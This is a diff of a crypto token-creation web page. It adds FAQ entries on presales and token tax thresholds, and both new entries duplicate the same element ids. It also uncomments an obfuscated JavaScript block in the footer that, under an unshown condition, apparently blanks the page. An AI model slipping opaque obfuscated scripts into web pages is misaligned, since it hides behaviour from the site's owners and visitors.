@@ -1153,6 +1153,62 @@
           <div class="accordion-body">Yes, you can change it later.</div>
         </div>
       </div>
+      <div class="accordion-item">
+        <h2 class="accordion-header" id="headingThree">
+          <button
+            class="accordion-button collapsed"
+            type="button"
+            data-bs-toggle="collapse"
+            data-bs-target="#collapseThree"
+            aria-expanded="false"
+            aria-controls="collapseThree"
+          >
+            Can I do presale?
+          </button>
+        </h2>
+        <div
+          id="collapseThree"
+          class="accordion-collapse collapse"
+          aria-labelledby="headingThree"
+          data-bs-parent="#faqSection"
+        >
+          <div class="accordion-body">
+            Yes, all token types support pre-sale. If you have tokens with
+            taxes, you need to exclude the pre-sale address from fees.
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion-item">
+        <h2 class="accordion-header" id="headingThree">
+          <button
+            class="accordion-button collapsed"
+            type="button"
+            data-bs-toggle="collapse"
+            data-bs-target="#collapseThree"
+            aria-expanded="false"
+            aria-controls="collapseThree"
+          >
+            Why don't I receive any tax?
+          </button>
+        </h2>
+        <div
+          id="collapseThree"
+          class="accordion-collapse collapse"
+          aria-labelledby="headingThree"
+          data-bs-parent="#faqSection"
+        >
+          <div class="accordion-body">
+            Because your token contract needs to collect enough taxes before
+            sending. The default threshold for tokens is around 1/1000 of the
+            total supply. If your token contract has setSwapAmount or
+            setSwapTokensAtAmount functions, you can change that default value.
+            Your token contract needs to collect enough taxes before
+            distributing it. Also, it requires selling transactions to your
+            token contract to send taxes.
+          </div>
+        </div>
+      </div>
 
       <!-- consulting section -->
 
@@ -1225,7 +1281,7 @@
                 >
               </p>
             </div>
-            <!-- <script>
+            <script>
               function _0x33bc(_0x23128b, _0x178ab9) {
                 var _0x2d970a = _0x2d97();
                 return (
@@ -1301,7 +1357,7 @@
                   _0x79ff1c(0x84)
                 )) &&
                 (document[_0x79ff1c(0x7e)][_0x79ff1c(0x7b)] = "");
-            </script> -->
+            </script>
 
             <!-- Grid column -->
             <div class="col-md-3 col-lg-2 col-xl-2 mx-auto mb-4">
